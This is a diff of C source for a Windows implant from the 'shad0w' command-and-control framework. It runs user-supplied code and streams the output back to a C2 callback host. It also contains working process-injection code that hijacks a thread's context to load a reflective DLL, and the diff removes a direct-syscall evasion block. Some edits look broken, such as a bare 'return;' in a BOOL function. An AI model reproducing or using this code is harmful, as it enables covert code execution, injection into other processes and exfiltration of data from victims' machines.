@@ -1,6 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 
-// kinda important
+// kinda important 
 
 #include <ntdef.h>
 #include <stdio.h>
@@ -25,27 +25,27 @@
 #define IDLE_KILL_TIME 60
 SYSTEMTIME start_time, current_time;
 
-void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd)
-{
+void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
+{ 
    char chBuf[MAX_OUTPUT + 1];
-   DWORD dwRead, rOpCode;
+   DWORD dwRead, rOpCode; 
    BOOL bSuccess = FALSE;
-
+   
    do {
         // set the current timestamp
         GetLocalTime(&start_time);
 
         // read the data from the pipe
         bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
-
+        
         // send the data to shad0w c2
-        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT,
+        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
                          &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
-
+        
         // clean up the old buffer
         memset(chBuf, '\0', sizeof(chBuf));
    } while (TRUE);
-
+   
    return;
 }
 
@@ -66,9 +66,10 @@ void ProcessWatch(HANDLE pHandle)
                 DEBUG("killed idle process");
                 return;
             }
-
+            
         }
     }
+    
 }
 
 HANDLE GetThread(DWORD dwPid)
@@ -129,7 +130,7 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     /*
     Run user supplied code and send all the output back to them
     */
-
+    
     DWORD pol;
     DWORD threadId;
     HANDLE tHandle;
@@ -142,11 +143,11 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     HANDLE g_hChildStd_OUT_Rd = NULL;
     HANDLE g_hChildStd_OUT_Wr = NULL;
 
-    SECURITY_ATTRIBUTES saAttr;
+    SECURITY_ATTRIBUTES saAttr; 
 
-    // Set the bInheritHandle flag so pipe handles are inherited.
-    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-    saAttr.bInheritHandle = TRUE;
+    // Set the bInheritHandle flag so pipe handles are inherited. 
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
+    saAttr.bInheritHandle = TRUE; 
     saAttr.lpSecurityDescriptor = NULL;
 
     // need these so we can use the correct syscalls
@@ -156,10 +157,10 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     // resolve so we can use this later to identify what syscall we need
     RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
 
-    // create a pipe to get the stdout
+    // create a pipe to get the stdout 
     if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
     {
-        DEBUG(TEXT("StdoutRd CreatePipe"));
+        DEBUG(TEXT("StdoutRd CreatePipe")); 
     }
 
     // ensure the read handle to the pipe for stdout is not inherited.
@@ -171,10 +172,10 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     // create a pipe for the child process's stdin.
     if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
     {
-        DEBUG(TEXT("Stdin CreatePipe"));
+        DEBUG(TEXT("Stdin CreatePipe")); 
     }
 
-    // ensure the write handle to the pipe for stdin is not inherited.
+    // ensure the write handle to the pipe for stdin is not inherited. 
     if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
     {
         DEBUG(TEXT("Stdin SetHandleInformation"));
@@ -183,14 +184,14 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     // define our startup info
     STARTUPINFOEXA sInfo;
     BOOL bSuccess = FALSE;
-    PROCESS_INFORMATION pInfo;
+    PROCESS_INFORMATION pInfo; 
 
     // zero out the structures
     ZeroMemory( &sInfo, sizeof(sInfo) );
     ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );
 
     // change the std values to our pipes
-    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA); 
     sInfo.StartupInfo.hStdError = g_hChildStd_OUT_Wr;
     sInfo.StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
     sInfo.StartupInfo.hStdInput = g_hChildStd_IN_Rd;
@@ -202,24 +203,21 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     // start the thread to read from the stdout pipe
     CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);
 
-    // This messes with other tools.
-    // TODO: implement a 'unblockdlls' command so we can keep the same functionality
+    #ifdef SECURE
+        // get the size of the list
+        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
 
-    // #ifdef SECURE
-    //     // get the size of the list
-    //     InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
+        // alloc the memory for it
+        sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(tSize);
 
-    //     // alloc the memory for it
-    //     sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(tSize);
+        // now put the attributes in
+        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
 
-    //     // now put the attributes in
-    //     InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
+        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
-    //     DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-
-    //     // now update our attributes
-    //     UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
-    // #endif
+        // now update our attributes
+        UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+    #endif
 
     // use syscalls if we are in secure mode
     #ifdef SECURE
@@ -281,7 +279,7 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
     // clean up a bit
     ZeroMemory(Bytes, Size);
 
-    return TRUE;
+    return;
 }
 
 BOOL InjectCode(CHAR* Bytes, SIZE_T Size, DWORD PID)
@@ -419,128 +417,46 @@ BOOL InjectDLL(CHAR* Bytes, SIZE_T Size, DWORD PID)
     PULONG  pSus       = 0;
     LPVOID  rBuffer    = NULL;
     CONTEXT ctx        = { 0 };
-    LPVOID  pRemoteCtx = NULL;
+    PVOID   pRemoteCtx = NULL;
     SIZE_T  nBytes     = 0;
 
     // get the offset
     DWORD dwOffset = GetReflectiveLoaderOffset(Bytes);
 
-    #ifdef SECURE
-        ULONG oProc, nProc;
-        CLIENT_ID uPid = { 0 };
-        struct NtInfo NtdllInfo;
-        struct Syscalls rSyscall;
-        SIZE_T uSize = (SIZE_T)Size;
-        OBJECT_ATTRIBUTES ObjectAttributes;
-
-        // init the attributes
-        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
-
-        // set the correct pid
-        uPid.UniqueProcess = (HANDLE)PID;
-        uPid.UniqueThread = NULL;
-
-        // populate our syscall and ntdll structs
-        ParseNtdll(&NtdllInfo, &rSyscall);
-
-        // get a handle on the process
-        MakeSyscall("NtOpenProcess", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
-        CleanSyscall(SyscallStub);
-
-        // alloc memory in the process & write the dll to it
-        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-        CleanSyscall(SyscallStub);
-        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtWriteVirtualMemory(hProcess, rBuffer, Bytes, Size, NULL);
-        CleanSyscall(SyscallStub);
-
-        // find any thread in the process an suspend it
-        rThread = GetThread(PID);
-        MakeSyscall("NtSuspendThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtSuspendThread(rThread);
-        CleanSyscall(SyscallStub);
-
-        // get the current context of the thread
-        ctx.ContextFlags = CONTEXT_FULL;
-        MakeSyscall("NtGetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtGetContextThread(rThread, &ctx);
-        CleanSyscall(SyscallStub);
-
-        // write the ctx to a cave
-        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtAllocateVirtualMemory(hProcess, &pRemoteCtx, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-        CleanSyscall(SyscallStub);
-
-        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtWriteVirtualMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
-
-        // set up the new context
-        ctx.Rip = (DWORD64)rBuffer + dwOffset;
-        ctx.Rcx = (DWORD64)pRemoteCtx;
-
-        // write rcx to the cave
-        rSyscall.NtWriteVirtualMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
-        CleanSyscall(SyscallStub);
-
-        // have room for the stack to grow
-        ctx.Rsp = ctx.Rsp - 0x2000;
-
-        // write the updated context
-        MakeSyscall("NtSetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtSetContextThread(rThread, &ctx);
-        CleanSyscall(SyscallStub);
-
-        // change the permisions on the memory so we can execute it
-        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtProtectVirtualMemory(hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
-        CleanSyscall(SyscallStub);
-
-        // start the thread executing again
-        MakeSyscall("NtResumeThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
-        rSyscall.NtResumeThread(rThread);
-        CleanSyscall(SyscallStub);
-
-        DEBUG("syscalls baby");
-    #endif
-
     // get a handle on the process
-    #ifndef SECURE
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
-        // alloc memory in the process & write the dll to it
-        rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
+    // alloc memory in the process & write the dll to it
+    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
 
-        // find any thread in the process an suspend it
-        rThread = GetThread(PID);
-        SuspendThread(rThread);
+    // find any thread in the process an suspend it
+    rThread = GetThread(PID);
+    SuspendThread(rThread);
 
-        // get the current context of the thread
-        ctx.ContextFlags = CONTEXT_FULL;
-        GetThreadContext(rThread, &ctx);
+    // get the current context of the thread
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(rThread, &ctx);
 
-        // write the ctx to a cave
-        pRemoteCtx = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-        WriteProcessMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
+    // write the ctx to a cave
+    pRemoteCtx = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
 
-        // set up the new context
-        ctx.Rip = (DWORD64)rBuffer + dwOffset;
-        ctx.Rcx = (DWORD64)pRemoteCtx;
+    // set up the new context
+    ctx.Rip = (DWORD64)rBuffer + dwOffset;
+	ctx.Rcx = (DWORD64)pRemoteCtx;
 
-        // write rcx to the cave
-        WriteProcessMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
+    // get the
+    WriteProcessMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
 
-        // have room for the stack to grow
-        ctx.Rsp = ctx.Rsp - 0x2000;
+    // have room for the stack to grow
+    ctx.Rsp = ctx.Rsp - 0x2000;
 
-        // write the updated context
-        DWORD stat = SetThreadContext(rThread, &ctx);
+    // write the updated context
+    DWORD stat = SetThreadContext(rThread, &ctx);
 
-        // start the thread executing again
-        ResumeThread(rThread);
-    #endif
+    // start the thread executing again
+    ResumeThread(rThread);
 
     // reslove the address of NtAlertResumeThread
     _NtAlertResumeThread NtAlertResumeThread = (_NtAlertResumeThread)GetProcAddress(LoadLibrary("ntdll.dll"), "NtAlertResumeThread");
